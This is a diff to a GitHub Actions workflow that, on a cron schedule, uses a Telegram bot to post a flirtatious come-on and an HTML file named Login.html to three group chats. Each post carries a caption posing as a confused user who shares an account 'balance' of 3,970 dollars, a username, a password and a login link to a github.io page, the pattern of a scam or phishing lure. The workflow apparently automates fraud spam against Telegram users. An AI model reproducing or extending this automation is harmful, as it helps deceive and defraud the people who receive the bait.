@@ -2,36 +2,65 @@ name: Send Message
 
 on:
   schedule:
-    - cron: '50 20 * * *'
-    - cron: '50 1 * * *'
-    - cron: '0 21 * * *'
-    - cron: '0 2 * * *'
+    # ===== GROUP 1 (4 PM & 9 PM) =====
+    - cron: '50 20 * * *'   # 3:50 PM (greeting)
+    - cron: '0 21 * * *'    # 4:00 PM (file)
+    - cron: '50 1 * * *'    # 8:50 PM (greeting)
+    - cron: '0 2 * * *'     # 9:00 PM (file)
+
+    # ===== GROUP 2 (5 PM & 10 PM) =====
+    - cron: '0 22 * * *'    # 5:00 PM (file)
+    - cron: '0 3 * * *'     # 10:00 PM (file)
+
+    # ===== GROUP 3 (6 PM & 11 PM) =====
+    - cron: '0 23 * * *'    # 6:00 PM (file)
+    - cron: '0 4 * * *'     # 11:00 PM (file)
+
   workflow_dispatch:
 
 jobs:
-  send-greeting:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Send greeting
-        env:
-          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
-          CHAT_ID: ${{ secrets.CHAT_ID }}
-        run: |
-          curl -s -X POST https://api.telegram.org/bot${BOT_TOKEN}/sendMessage \
-          -d chat_id=${CHAT_ID} \
-          -d text="Hi baby 😏 How's it going?%0AWhen are you going to come talk to me? 😘%0AI'm waiting... 💋"
-
-  send-file:
+  send:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Send HTML file
+
+      # ===== GROUP 1 (Full: Greeting + File) =====
+      - name: Send greeting to Group 1
         env:
           BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
-          CHAT_ID: ${{ secrets.CHAT_ID }}
+        run: |
+          curl -s -X POST https://api.telegram.org/bot${BOT_TOKEN}/sendMessage \
+          -d chat_id=-1002507938213 \
+          -d text="Hi baby 😏 How's it going?%0AWhen are you going to come talk to me? 😘%0AI'm waiting... 💋"
+
+      - name: Send file to Group 1
+        env:
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
         run: |
           CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
           curl -s -F document=@Login.html \
-          -F chat_id=${CHAT_ID} \
+          -F chat_id=-1002507938213 \
+          -F caption="$CAPTION" \
+          https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
+
+      # ===== GROUP 2 (Only File - 5 PM & 10 PM) =====
+      - name: Send file to Group 2
+        env:
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+        run: |
+          CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          curl -s -F document=@Login.html \
+          -F chat_id=-1002665528411 \
+          -F caption="$CAPTION" \
+          https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
+
+      # ===== GROUP 3 (Only File - 6 PM & 11 PM) =====
+      - name: Send file to Group 3
+        env:
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+        run: |
+          CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          curl -s -F document=@Login.html \
+          -F chat_id=-1002680039813 \
           -F caption="$CAPTION" \
           https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
